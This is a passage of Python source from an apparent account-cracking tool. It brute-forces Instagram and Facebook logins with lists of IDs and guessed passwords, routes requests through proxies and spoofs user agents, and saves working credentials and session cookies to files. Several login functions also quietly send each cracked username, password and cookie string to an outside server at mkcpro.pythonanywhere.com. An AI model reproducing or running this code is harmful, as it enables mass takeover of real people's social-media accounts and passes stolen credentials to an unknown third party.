        print(f"{self.dot_string('2')} {G}Method {Y}[{G}api{Y}]")
        self.divider()
        method = input(f"{self.dot_string('?')} {G}Select {Y}: {G}")
        self.refresh()
        print(f"{self.dot_string('•')} Maximum Passlist Limit {Y}: {G}10")
        self.divider()
        pw_limit = int(input(f"{self.dot_string('+')} Enter Passlist Limit {Y}: {G}"))
        self.refresh()
        print(f"{self.dot_string('•')} Example {Y}: {G}first6, last6, 57273200")
        print(f"{self.dot_string('•')} Example {Y}: {G}first7, last7,, fullnumber")
        self.divider()
        for p in range(pw_limit):
            count = p+1
            pw_ask = input(f"{self.dot_string(count)} Enter Password {Y}: {G}")
            self.cppp.append(pw_ask)
        with TPE(max_workers=30) as clone_sub:
            self.refresh()
            total_id = str(len(self.idzz))
            print(f"{self.dot_string('•')} {G}Total Accounts {Y}: {G}{total_id}")
           #print(f"{self.dot_string('•')} {G}Selected Code  {Y}: {G}{codee}")
            print(f"{self.dot_string('•')} {G}Process Has Been Started...")
            print(f"{self.dot_string('•')} {G}Use Auto Clicker For OK IDs")
            self.divider()
            for love in self.idzz:
                uid = code+love
                password = self.cppp
                if method == "1":clone_sub.submit(self.fbook_M1, uid, password, total_id)
                elif method == "2":clone_sub.submit(self.fbook_M2, uid, password, total_id)
                else:clone_sub.submit(self.fbook_M1, uid, password, total_id)
        print(self.linee)
        print(f"{self.dot_string('√')} {G}Process Completed ")
        print(f"{self.dot_string('•')} {G}Total OK {Y}: {G}{str(len(self.okss))}")
        print(f"{self.dot_string('•')} {G}Total CP {Y}: {G}{str(len(self.cpss))}")
        print(f"{self.dot_string('!')} {G}All Accounts Saved In /sdcard ")
        sys.exit(print(self.linee+f"\n{self.dot_string('!')} {G}Thanks for using tools"))
    
    def insta_M1(self, uid, password, total_id):
        sys.stdout.write(f"\r{R}[{G}DEV-M1{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        try:
            for pw in password:
                ses = requests.Session()
                ua = UserAgent()
                proxies = {"http": "socks4://"+random.choice(proxx)}
                curl = ses.get("https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid="+str(uuid.uuid4()))
                payload = json.dumps({"phone_id": str(uuid.uuid4()), "_csrftoken": curl.cookies.get("csrftoken","TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E"), "username": uid, "guid": str(uuid.uuid4()), "device_id": "android-"+str(uuid.uuid4()), "password": pw, "login_attempt_count": "0"})
                param = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
                data = "ig_sig_key_version=4&signed_body="+param
                headers = {"Authority": "i.instagram.com", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Connection": "Close", "User-Agent": ua, "X-IG-Capabilities": "Fw==", "X-IG-App-ID": "936619743392459", "Cookie": "csrftoken="+curl.cookies.get("csrftoken")+";mid="+curl.cookies.get("mid")+";dpr=2;ig_nrcb=1"}
                url = "https://i.instagram.com/api/v1/accounts/login/"
                response = ses.post(url, data=data, headers=headers, proxies=proxies)
                if "logged_in_user" in str(response.text):
                    cookies_ = ";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
                    send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={uid}|{pw}|{cookies_}").json()
                    print(f"{G}[DEV-OK] {uid}|{pw}{X}")
                    print(f"{R}[{G}Cookies{R}] {G}{cookies_}{X}")
                    open("/sdcard/DEV-OK.txt","a").write(f"{uid}|{pw}|{cookies_}\n")
                    self.okss.append(uid+"|"+pw)
                    break
                elif "https://i.instagram.com/challenge/" in str(response.text):
                   #print(f"{R}[Insta-CP] {uid}|{pw}{X}")
                    open("/sdcard/DEV-CP.txt","a").write(f"{uid}|{pw}\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except CE:
            time.sleep(10)
        except Exception as error:
            pass
    
    def insta_M2(self, uid, password, total_id):
        sys.stdout.write(f"\r{R}[{G}DEV-M2{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        ts = calendar.timegm(current_GMT)
        try:
            for pw in password:
                ses = requests.Session()
               #ua = instagram_user_agents()
                proxies = {"http": "socks4://"+random.choice(proxx)}
                curl = ses.get("https://www.instagram.com/web/__mid")
                ses.headers.update({
                 'Authority': 'www.instagram.com',
                 'Accept':'*/*',
                 'Accept-Encoding':'gzip, deflate, br',
                 'Accept-Language':'en-US,en;q=0.9',
                 'Content-Length':'353',
                 'Content-Type':'application/x-www-form-urlencoded',
                 'Origin':'https://www.instagram.com',
                 'Referer':'https://www.instagram.com/accounts/login/?force_classic_login=&',
                 'Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                 'Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"',
                 'Sec-Ch-Ua-Mobile':'?0',
                 'Sec-Fetch-Dest':'empty',
                 'Sec-Fetch-Mode':'cors',
                 'Sec-Fetch-Site':'same-origin',
                 'User-Agent': redmi_instagram_ua(),
                 'X-Asbd-Id':'129477',
                 'X-Csrftoken': ses.cookies['csrftoken'],
                 'X-Ig-App-Id':'936619743392459',
                 'X-Ig-Www-Claim':'hmac.AR05k4r4Hi4qW2gWrhumyq_wGultMubwNGuatj_4cas9Lr1e',
                 'X-Instagram-Ajax':'1007725354',
                 'X-Requested-With':'XMLHttpRequest'
                })
                data = {
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": uid,
                    "queryParams": "{}",
                    "optIntoOneTap": False,
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}",
                }
                url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
                response = ses.post(url, data=data, proxies=proxies, allow_redirects=True)
                response_json = json.loads(response.text)
                if "userId" in str(response_json):
                    cookies_ = ";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
                    send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={uid}|{pw}|{cookies_}").json()
                    print(f"{G}[DEV-OK] {uid}|{pw}{X}")
                    print(f"{R}[{G}Cookies{R}] {G}{cookies_}{X}")
                    open("/sdcard/DEV-OK.txt","a").write(f"{uid}|{pw}|{cookies_}\n")
                    self.okss.append(uid+"|"+pw)
                    break
                elif "checkpoint_url" in str(response_json):
                    print(f"{R}[DEV-CP] {uid}|{pw}{X}")
                    open("/sdcard/DEV-CP.txt","a").write(uid+"|"+pw+"\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except CE:
            time.sleep(10)
        except Exception as error:
           pass
    
    def fbook_M1(self, uid, password, total_id):
        sys.stdout.write(f"\r{R}[{G}DEV-M1{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        try:
            for pw in password:
                ses = requests.Session()
               #ua = samsung_user_agent()
                proxies = {"http": "socks4://"+random.choice(proxx)}
                requu1 = ses.get("https://touch.facebook.com/")
                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '', '__user': '0'}
                headers = {
                'authority': 'mbasic.facebook.com',
                'method': 'POST',
                'path': '/login/device-based/login/async/',
                'scheme': 'https',
                'accept': '*/*',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mbasic.facebook.com',
                'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=779900868722692&kid_directed_site=0&app_id=779900868722692&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': generate_ua(),
                'x-asbd-id': '359341',
                'x-fb-lsd': '',
                'x-requested-with': 'XMLHttpRequest',
                'x-response-format': 'JSONStream',}
                url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=779900868722692&auth_token=af06de30d9acd77f7bbc31679fd0f694&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&refsrc=deprecated&app_id=779900868722692&cancel=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&lwv=100"
                po = ses.post(url, data=data, headers=headers, allow_redirects=False).text
                response = ses.cookies.get_dict().keys()
                if "c_user" in response:
                    kuki=";".join([f"{key}={ses.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    xs_value = None
                    for part in kuki.split(';'):
                        if part.startswith('xs='):
                            xs_value = part.split('=', 1)[1]
                            break
                    ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                    res = requests.get(ckk).text
                    if 'Photoshop' in res:
                        #send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={user}|{pw}|{kuki_}").json()
                        if xs_value and xs_value.rstrip(';').endswith('-1'):
                            print('\033[1;92m [DEV-NV🤡] '+user+' | '+pw+' | '+kuki+'\n')
                           #print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;93m"+kuki)
                            open("/sdcard/DEV-NV.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            open("/sdcard/DEV-NV-UID.txt","a").write(user+"|"+pw+"\n")
                            self.okss.append(user+"|"+pw)
                            break
                        else:
                            print('\033[1;92m [DEV-OK🔥] '+user+' | '+pw+' | '+kuki+'\n')
                           #print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/DEV-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            open("/sdcard/DEV-OK-UID.txt","a").write(user+"|"+pw+"\n")
                            self.okss.append(user+"|"+pw)
                            break
                elif "checkpoint" in response:
                   #print(f" {R}[DEV-CP] {uid}|{pw}")
                    open("/sdcard/dev-cp.txt", "a").write(uid+"|"+pw+"\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except Exception as error:
            pass
    
    def fbook_M2(self, uid, password, total_id):
        sys.stdout.write(f"\r{R}[{G}DEV-M2{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        try:
            for pw in password:
              #ua = random.choice(ugen)
                ses = requests.Session()
                proxies = {"http": "socks4://"+random.choice(proxx)}
                requu1 = ses.get("https://touch.facebook.com/")
                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '', '__user': '0'}
                headers = {
                'authority': 'www.facebook.com',
                'method': 'POST', 
                'path': '/login/device-based/regular/login/?login_attempt=1', 
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8', 
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '3',
                'origin': 'https://www.facebook.com',
                'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=1718380515655421&kid_directed_site=0&app_id=1718380515655421&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa3f64cb62f26007f%26domain%3Dwww.joytify.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joytify.com%252Ff2236f8decdda0d2e%26relation%3Dopener%26frame%3Dfb83b5c58426b5953%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0', 
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""', 
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': fbook_uaaa(),
                'viewport-width': '980'}                 
                url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&popup=1&lwv=100"
                po = ses.post(url, data=data, headers=headers, allow_redirects=False).text
                response = ses.cookies.get_dict().keys()
                if "c_user" in response:
                    kuki=";".join([f"{key}={ses.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    xs_value = None
                    for part in kuki.split(';'):
                        if part.startswith('xs='):
                            xs_value = part.split('=', 1)[1]
                            break
                    ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                    res = requests.get(ckk).text
                    if 'Photoshop' in res:
                       #send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={user}|{pw}|{kuki_}").json()
                        if xs_value and xs_value.rstrip(';').endswith('-1'):
                            print('\033[1;92m [DEV-NV🤡] '+user+' | '+pw+' | '+kuki+'\n')
                           #print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;93m"+kuki)
                            open("/sdcard/DEV-NV.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            open("/sdcard/DEV-NV-UID.txt","a").write(user+"|"+pw+"\n")
                            self.okss.append(user+"|"+pw)
                            break
                        else:
                            print('\033[1;92m [DEV-OK😹] '+user+' | '+pw+' | '+kuki+'\n')
                           #print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/DEV-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            open("/sdcard/DEV-OK-UID.txt","a").write(user+"|"+pw+"\n")
                            self.okss.append(user+"|"+pw)
                            break
                elif "checkpoint" in response:
                   #print(f" {R}[DEV-CP] {uid}|{pw}")
                    open("/sdcard/dev-cp.txt", "a").write(uid+"|"+pw+"\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except Exception as error:
            pass

    
class file_clone:
    def __init__(self):
        self.idzz = []
        self.loop = 0
        self.okss = []
        self.cpss = []
        self.nvss = []
        self.pwss = []
        self.method_select = []
        self.refresh = lambda: main().refresh()
        self.divider = lambda: main().divider()
        self.linee = f"{C}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━{X}"
        self.dot_string = lambda text:f"{R}[{G}{text}{R}]{X}"
        self.refresh()
        try:
            file_path = input(f"{self.dot_string('?')} {G}File {Y}: {G}")
            for x in open(file_path, 'r').readlines():self.idzz.append(x.strip())
        except Exception:print(self.linee+f"\n{self.dot_string('!')} {R}Somethint went wrong");time.sleep(1);start()
        self.select_password()
    
    def select_password(self):
        self.refresh()
        how = int(input(f"{self.dot_string('?')} {G}Password Limit {Y}: {G}"))
        for x in range(how):
            count = x+1
            self.pwss.append(input(f"{self.dot_string(count)} {G}Enter Password {Y}: {G}"))
        self.select_method()
        self.cloning_process()
    
    def select_method(self):
        self.refresh()
        print(f" {self.dot_string('1')} {G}Method 1 ")
        print(f" {self.dot_string('2')} {G}Method 1 ")
        select = input(f"{self.dot_string('?')} {G}Select Method {Y}: {G}")
        if select == "1":self.method_select.append("1")
        elif select == "2":self.method_select.append("2")
        else:self.method_select.append("2")
    
    def cloning_process(self):
        self.refresh()
        total_id = str(len(self.idzz))
        print(f"{self.dot_string('•')} {G}Total Accounts {Y}: {G}{total_id}")
        print(f"{self.dot_string('•')} {G}Process Has Been Started...")
        print(f"{self.dot_string('•')} {G}Use Auto Clicker For OK IDs")
        self.divider()
        with TPE(max_workers=30) as send:
            for uids in self.idzz:
                uids = uids.strip().lower()
                uid,name = uids.rsplit('|')
                first = name.rsplit(' ')[0]
                try:
                    last = name.rsplit(' ')[1]
                except Exception as e:
                    last = first
                if "1" in self.method_select:send.submit(self.cloning1,uid,first,last)
                elif "2" in self.method_select:send.submit(self.cloning2,uid,first,last)
                else:send.submit(self.cloning2,uid,first,last)
        print(self.linee)
        print(f"{self.dot_string('√')} {G}Process Completed ")
        print(f"{self.dot_string('•')} {G}Total OK {Y}: {G}{str(len(self.okss))}")
        print(f"{self.dot_string('•')} {G}Total CP {Y}: {G}{str(len(self.cpss))}")
        print(f"{self.dot_string('!')} {G}All Accounts Saved In /sdcard ")
        sys.exit(print(self.linee+f"\n{self.dot_string('!')} {G}Thanks for using tools"))
    
    def cloning1(self,uid,first,last):
        sys.stdout.write(f"\r{R}[{G}DEV-F1{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        try:
            for pw in self.pwss:
                ua = fbook_uaaa()
                ses = requests.Session()
                pw = pw.replace("first", first).replace("last", last).replace("First", first.capitalize()).replace("Last", last.capitalize())
                headers = {'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-sim-hni': str(random.randrange(50000, 600000)), 'x-fb-net-hni': str(random.randrange(50000, 600000)), 'Content-Type': 'application/x-www-form-urlencoded', 'x-graphql-client-library': 'graphservice', 'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request', 'x-tigon-is-retry': 'False', 'x-fb-privacy-context': '3643298472347298', 'x-graphql-request-purpose': 'fetch', 'x-fb-device-group': '5530', 'User-Agent': ua, 'x-fb-connection-type': 'WIFI', 'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808', 'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 'Accept-Encoding': 'gzip, deflate', 'x-fb-http-engine': 'Tigon/Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True'}
                ses.headers.update(headers)
                enc_pass = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
                data = {'method': 'post', 'pretty': False, 'format': 'json', 'server_timestamps': True, 'locale': 'en_IN', 'purpose': 'fetch', 'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request', 'fb_api_caller_class': 'graphservice', 'client_doc_id': '11994080425603935587861051615', 'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+enc_pass+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"waterfall_id\\\":\\\"278dd0ac-58b3-46e4-aa8e-ea55021589a6\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}), 'fb_api_analytics_tags': '["GraphServices"]', 'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
                encode = urllib.parse.urlencode(data, doseq=True)
                url = "https://graph.facebook.com/graphql"
                response = ses.post(url, data=encode)
                if "session_key" in response.text and "uid" in response.text:
                    #cookies_ = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={uid}|{pw}").json()
                    print(f"{G}[DEV-OK] {uid}|{pw}{X}")
                   #print(f"{R}[{G}Cookies{R}] {G}{cookies_}{X}")
                    #open("/sdcard/DEV-OK.txt","a").write(f"{uid}|{pw}|{cookies_}\n")
                    open("/sdcard/DEV-OK.txt","a").write(f"{uid}|{pw}\n")
                    self.okss.append(uid+"|"+pw)
                    break
                elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                    print(f"{R}[DEV-CP] {uid}|{pw}{X}")
                    open("/sdcard/DEV-CP.txt","a").write(uid+"|"+pw+"\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except CE:
            time.sleep(10)
        except Exception as error:
            pass
    
    def cloning2(self,uid,first,last):
        sys.stdout.write(f"\r{R}[{G}DEV-F2{R}] {R}[{G}{self.loop}{R}] {C}[{G}{len(self.okss)}{Y}/{R}{len(self.cpss)}{C}]{X}\r"),
        sys.stdout.flush()
        try:
            for pw in self.pwss:
                ua = samsung_user_agent()
                ses = requests.Session()
                pw = pw.replace("first", first).replace("last", last).replace("First", first.capitalize()).replace("Last", last.capitalize())
